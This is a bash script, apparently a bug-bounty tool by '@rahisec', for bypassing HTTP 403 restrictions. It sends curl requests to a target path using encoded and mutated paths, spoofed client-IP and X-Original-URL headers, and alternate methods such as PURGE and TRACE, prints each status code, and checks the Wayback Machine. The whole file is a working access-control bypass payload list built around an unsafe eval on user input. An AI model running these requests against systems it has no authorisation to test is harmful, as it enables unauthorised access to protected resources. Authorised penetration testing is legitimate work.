#!/bin/bash 
echo "
			  _  _    ___ ____  _
			 | || |  / _ \___ \| |
			 | || |_| | | |__) | |__  _ __
			 |__   _| | | |__ <| '_ \| '_ \
			    | | | |_| |__) | |_) | |_) |
			    |_|  \___/____/|_.__/| .__/
					 @rahisec| |
			                         |_|
"

echo "./403bp.sh https://example.com path"
echo "./403bp.sh https://example.com api/v2"
echo "or if you found 302, try ./403bp.sh https://example.com path/"

print_colored_text() {
    local color_code=$1
    local text=$2
    echo -e "\e[${color_code}m${text}\e[0m"
}

perform_curl_request() {
    local command=$1
    local url=$2

    status_code=$(eval "${command} ${url}" -o /dev/null -w "%{http_code}")

    if [[ $status_code == "200" ]]; then
        print_colored_text "32" "  --> ${status_code} ${url}"
    elif [[ $status_code == "301" ]]; then
        print_colored_text "33" "  --> ${status_code} ${url}"
    elif [[ $status_code == "302" ]]; then
        print_colored_text "35" "  --> ${status_code} ${url}"
    else
        print_colored_text "31" "  --> ${status_code} ${url}"
    fi
}

url=$1
parameter=$2

payloads=(
    "${url}/${parameter}"
    "${url}/%2e/${parameter}"
    "${url}/${parameter}/."
    "${url}//${parameter}//"
    "${url}/./${parameter}/./"
    "${url}/${parameter}?anything"
    "${url}/${parameter}.html"
    "${url}/${parameter}#"
    "${url}/${parameter}/*"
    "${url}/${parameter}.php"
    "${url}/${parameter}.json"
    "${url}/${parameter}/%20"
    "${url}/${parameter}/%09"
    "${url}/${parameter}/%09."
    "${url}/${parameter}~"
    "${url}/${parameter}/~"
    "${url}/${parameter}~${parameter}"
    "${url}/${parameter}.ini"
    "${url}/${parameter}.htaccess"
    "${url}/${parameter}"' -H "X-Originating-IP: 127.0.0.1"'
    "${url}/${parameter}"' -H "X-Forwarded: 127.0.0.1"'
    "${url}/${parameter}"' -H "X-Forwarded-For: 127.0.0.1"'
    "${url}/${parameter}"' -H "X-Forwarded-Host: 127.0.0.1"'
    "${url}/${parameter}"' -H "Forwarded-For: 127.0.0.1"'
    "${url}/${parameter}"' -H "X-Remote-IP: 127.0.0.1"'
    "${url}/${parameter}"' -H "X-Remote-Addr: 127.0.0.1"'
    "${url}/${parameter}"' -H "X-ProxyUser-Ip: 127.0.0.1"'
    "${url}/${parameter}"' -H "X-Original-URL: 127.0.0.1"'
    "${url}/${parameter}"' -H "Client-IP: 127.0.0.1"'
    "${url}/${parameter}"' -H "True-Client-IP: 127.0.0.1"'
    "${url}/${parameter}"' -H "Cluster-Client-IP: 127.0.0.1"'
    "${url}/${parameter}"' -H "X-ProxyUser-Ip: 127.0.0.1"'
    "${url}/${parameter}"' -H "Host: localhost"'
    "${url}/${parameter}"' -X POST'
    "${url}/${parameter}/"' -X POST'
    "${url}/${parameter}"' -X PURGE'
    "${url}/${parameter}"' -X TRACE'
)

for payload in "${payloads[@]}"; do
    perform_curl_request "curl -k -s" "$payload"
done

curl -s  https://archive.org/wayback/available?url=$1/$2 | jq -r '.archived_snapshots.closest | {available, url}'